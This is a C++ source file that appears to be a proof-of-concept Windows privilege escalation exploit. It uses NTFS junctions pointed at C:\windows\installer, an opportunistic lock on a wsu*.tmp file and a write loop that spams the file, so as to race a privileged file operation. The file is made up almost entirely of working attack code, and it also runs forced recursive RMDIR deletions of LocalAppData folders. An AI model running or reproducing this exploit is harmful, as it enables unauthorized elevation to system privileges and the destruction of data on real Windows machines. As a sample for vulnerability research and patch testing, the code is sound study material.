#include "stdafx.h"
#include "ReparsePoint.h"
#include <string>
#include <ShlObj.h>
#include <comdef.h>
#include "iostream"
#include "FileOpLock.h"
using namespace std;

bool triggered = false;
bstr_t GetAppDataDirectory()
{
	LPWSTR lpRet = nullptr;
	if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &lpRet)))
	{
		bstr_t r = lpRet;
		CoTaskMemFree(lpRet);

		return r;
	}

	return L"";
}

int StringToWString(std::wstring& ws, const std::string& s)
{
	std::wstring wsTmp(s.begin(), s.end());

	ws = wsTmp;

	return 0;
}

void test()
{
	triggered = true;
}
int main()
{
	//Variables
	LARGE_INTEGER li;
	std::string blah = "RMDIR \"";

	std::string blah2 = "\\PlaceholderTileLogoFolder\" /S /Q";
	blah.append(GetAppDataDirectory());
	blah.append(blah2);
	
	
	std::string blah5 = "RMDIR \"";

	std::string blah6 = "\\Temp\" /S /Q";
	blah5.append(GetAppDataDirectory());
	blah5.append(blah6);
	
	std::wstring ws(GetAppDataDirectory(), SysStringLen(GetAppDataDirectory()));
	ws.append(L"\\PlaceholderTileLogoFolder");

	bool continue1 = false;
	HANDLE hFind1;
	WIN32_FIND_DATAA FindFileData1;
	
	char filepath1[512];
	char* path1 = "c:\\bear1";
	HANDLE hFile;
	char DataBuffer[] = "I'm a bear inside a file";
	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;
	bool test1 = 0;
	///////////////////////
	HANDLE bear = GetCurrentThread();
	SetThreadPriority(bear, THREAD_PRIORITY_TIME_CRITICAL);
	system(blah.c_str());
	CreateDirectory(GetAppDataDirectory() + L"\\PlaceholderTileLogoFolder", NULL);
	CreateDirectory(L"C:\\bear", NULL);
	CreateDirectory(L"C:\\bear1", NULL);
	ReparsePoint::CreateMountPoint(ws, L"\\??\\c:\\bear", L"Bears!!!!!!!!!!!!!!!!!");
	system(blah5.c_str());
	CreateDirectory(GetAppDataDirectory() + L"\\Temp", NULL);
	
	
	
while (continue1 == false) {
	hFind1 = FindFirstFileA("C:\\bear\\*", &FindFileData1);


	while (FindNextFileA(hFind1, &FindFileData1) != 0)
	{
		if (strcmp(FindFileData1.cFileName, ".") == 0 || strcmp(FindFileData1.cFileName, "..") == 0)
		{
			continue;
		}
		continue1 = true;
		break;
	}
}
	
	ReparsePoint::CreateMountPoint(ws, L"\\??\\c:\\bear1", L"Polar bears are really cool");
	sprintf_s(filepath1, "%s\\%s", path1, FindFileData1.cFileName);
	CreateDirectoryA(filepath1, NULL);

	wstring blah1;
	string bla1(filepath1);
	StringToWString(blah1, bla1);
	ReparsePoint::CreateMountPoint(blah1, L"\\??\\c:\\windows\\installer", L"Bears are smart then the person reading this");
	HANDLE hFind;
	WIN32_FIND_DATAA FindFileData;
	
	string bl(GetAppDataDirectory());
	string bl2 = "\\Temp\\wsu*.tmp";
	bl.append(bl2);

	char filepath[512];

	std::string bl3(GetAppDataDirectory());
	std::string bl4 = "\\Temp";
	bl3.append(bl4);

	wstring blahz;
	do
	{
		hFind = FindFirstFileA(bl.c_str(), &FindFileData);
	} while (hFind == INVALID_HANDLE_VALUE);


	sprintf_s(filepath, "%s\\%s", bl3.c_str(), FindFileData.cFileName);

	
	string blaz(filepath);
	StringToWString(blahz, blaz);

	FileOpLock::CreateLock(blahz, test);

	while (triggered == false)
	{


			QueryPerformanceCounter(&li);
	}
	//Just spam this for a while.. bleh
	int count = 0;
	do {
		hFile = CreateFileA(filepath,                // name of the write
			GENERIC_WRITE,          // open for writing
			FILE_SHARE_READ | FILE_SHARE_WRITE,                      // do not share
			NULL,                   // default security
			OPEN_EXISTING,             // create new file only
			FILE_ATTRIBUTE_NORMAL,  // normal file
			NULL);                  // no attr. template

		test1 = WriteFile(
			hFile,           // open file handle
			DataBuffer,      // start of data to write
			dwBytesToWrite,  // number of bytes to write
			&dwBytesWritten, // number of bytes that were written
			NULL);            // no overlapped structure
		CloseHandle(hFile);
		count++;
	} while (count < 10000);


	system("RMDIR \"c:\\bear\" /S /Q");
	system("RMDIR \"c:\\bear1\" /S /Q");
	return 0;
}

